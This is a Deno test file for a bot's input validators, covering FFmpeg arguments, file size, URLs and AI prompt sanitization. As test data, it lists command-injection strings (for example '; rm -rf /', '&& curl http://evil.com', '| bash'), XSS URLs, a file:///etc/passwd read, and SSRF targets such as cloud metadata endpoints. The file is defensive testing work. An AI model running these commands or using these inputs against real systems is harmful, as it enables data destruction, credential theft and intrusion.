/**
 * @license
 * This file is part of Bott.
 *
 * This project is dual-licensed:
 * - Non-commercial use: AGPLv3 (see LICENSE file for full text).
 * - Commercial use: Proprietary License (contact D@nielLaCos.se for details).
 *
 * Copyright (C) 2025 DanielLaCos.se
 */

import { assertEquals, assertRejects, assertThrows } from "jsr:@std/assert";
import {
  validateFFmpegArgs,
  validateFileSize,
  validateUrl,
  sanitizeAIPrompt,
  MAX_FILE_SIZE,
} from "./validation.ts";

Deno.test("FFmpeg Validation - should allow safe arguments", () => {
  const safeArgs = [
    "-y", "-i", "{{INPUT_FILE}}", "-c:v", "libx264", "-preset", "medium",
    "-crf", "23", "-c:a", "aac", "-b:a", "128k", "{{OUTPUT_FILE}}"
  ];
  
  // Should not throw
  validateFFmpegArgs(safeArgs);
});

Deno.test("FFmpeg Validation - should reject command injection attempts", () => {
  const dangerousArgs = [
    ["-i", "input.mp4", ";", "rm", "-rf", "/"],
    ["-i", "input.mp4", "&&", "curl", "http://evil.com"],
    ["-i", "input.mp4", "|", "bash"],
    ["-i", "input.mp4", "`rm -rf /`"],
    ["-i", "input.mp4", "$(malicious_command)"],
    ["-f", "lavfi", "-i", "color=red:size=320x240", "-t", "1", "/dev/null; rm -rf /"],
  ];

  for (const args of dangerousArgs) {
    assertThrows(
      () => validateFFmpegArgs(args),
      Error,
      "Dangerous pattern detected",
    );
  }
});

Deno.test("FFmpeg Validation - should reject unauthorized arguments", () => {
  const unauthorizedArgs = [
    ["-exec", "arbitrary_command"],
    ["-filter_complex", "malicious_filter"],
    ["-lavfi", "evil_lavfi"],
    ["-protocol_whitelist", "file,http,tcp"],
    ["-unsafe", "1"],
  ];

  for (const args of unauthorizedArgs) {
    assertThrows(
      () => validateFFmpegArgs(args),
      Error,
      "Unsafe FFmpeg argument",
    );
  }
});

Deno.test("FFmpeg Validation - should allow numeric values within bounds", () => {
  const validNumericArgs = ["1", "30", "1920", "1080", "44100"];
  
  for (const arg of validNumericArgs) {
    validateFFmpegArgs(["-i", "{{INPUT_FILE}}", "-r", arg, "{{OUTPUT_FILE}}"]);
  }
});

Deno.test("FFmpeg Validation - should reject numeric values outside bounds", () => {
  const invalidNumericArgs = ["9999999", "-1"];
  
  for (const arg of invalidNumericArgs) {
    assertThrows(
      () => validateFFmpegArgs(["-i", "{{INPUT_FILE}}", "-r", arg, "{{OUTPUT_FILE}}"]),
      Error,
      "Unsafe FFmpeg argument",
    );
  }
});

Deno.test("FFmpeg Validation - should allow safe scale expressions", () => {
  const safeScaleArgs = [
    "scale=480:480",
    "scale=1920:1080:force_original_aspect_ratio=decrease:sws_flags=lanczos",
    "fps=24",
    "scale='trunc(iw*min(480/iw,480/ih)/2)*2':'trunc(ih*min(480/iw,480/ih)/2)*2':sws_flags=lanczos",
  ];

  for (const arg of safeScaleArgs) {
    validateFFmpegArgs(["-i", "{{INPUT_FILE}}", "-vf", arg, "{{OUTPUT_FILE}}"]);
  }
});

Deno.test("File Size Validation - should allow files under limit", () => {
  const smallFile = new Uint8Array(1024); // 1KB
  validateFileSize(smallFile); // Should not throw
});

Deno.test("File Size Validation - should reject files over limit", () => {
  const largeFile = new Uint8Array(MAX_FILE_SIZE + 1);
  
  assertThrows(
    () => validateFileSize(largeFile),
    Error,
    "File size",
  );
});

Deno.test("URL Validation - should allow safe HTTP/HTTPS URLs", () => {
  const safeUrls = [
    "https://example.com",
    "http://safe-domain.com/path?query=value",
    "https://cdn.example.org/image.jpg",
  ];

  for (const url of safeUrls) {
    validateUrl(url); // Should not throw
  }
});

Deno.test("URL Validation - should reject unsafe protocols", () => {
  const unsafeUrls = [
    "file:///etc/passwd",
    "ftp://example.com",
    "javascript:alert('xss')",
    "data:text/html,<script>alert('xss')</script>",
  ];

  for (const url of unsafeUrls) {
    assertThrows(
      () => validateUrl(url),
      Error,
      "Unsupported protocol",
    );
  }
});

Deno.test("URL Validation - should reject localhost and private IPs", () => {
  const privateUrls = [
    "http://localhost",
    "https://127.0.0.1",
    "http://192.168.1.1",
    "https://10.0.0.1",
    "http://172.16.0.1",
    "https://169.254.169.254", // AWS metadata
    "http://metadata.google.internal", // GCP metadata
  ];

  for (const url of privateUrls) {
    assertThrows(
      () => validateUrl(url),
      Error,
    );
  }
});

Deno.test("URL Validation - should reject invalid URLs", () => {
  const invalidUrls = [
    "not-a-url",
    "http://",
    "://missing-scheme",
    "http://[invalid-brackets",
  ];

  for (const url of invalidUrls) {
    assertThrows(
      () => validateUrl(url),
      Error,
      "Invalid URL",
    );
  }
});

Deno.test("AI Prompt Sanitization - should clean dangerous input", () => {
  const dangerousPrompt = "Create an image\x00\x01\x02with\n\n\nexcessive    whitespace\x7F";
  const sanitized = sanitizeAIPrompt(dangerousPrompt);
  
  assertEquals(sanitized, "Create an image with excessive whitespace");
});

Deno.test("AI Prompt Sanitization - should limit input length", () => {
  const longPrompt = "A".repeat(20000);
  const sanitized = sanitizeAIPrompt(longPrompt);
  
  assertEquals(sanitized.length, 10000);
});

Deno.test("AI Prompt Sanitization - should preserve valid content", () => {
  const validPrompt = "Create a beautiful landscape image with mountains and trees.";
  const sanitized = sanitizeAIPrompt(validPrompt);
  
  assertEquals(sanitized, validPrompt);
});

Deno.test("AI Prompt Sanitization - should handle empty input", () => {
  const sanitized = sanitizeAIPrompt("");
  assertEquals(sanitized, "");
});

Deno.test("AI Prompt Sanitization - should handle whitespace-only input", () => {
  const sanitized = sanitizeAIPrompt("   \n\t   ");
  assertEquals(sanitized, "");
});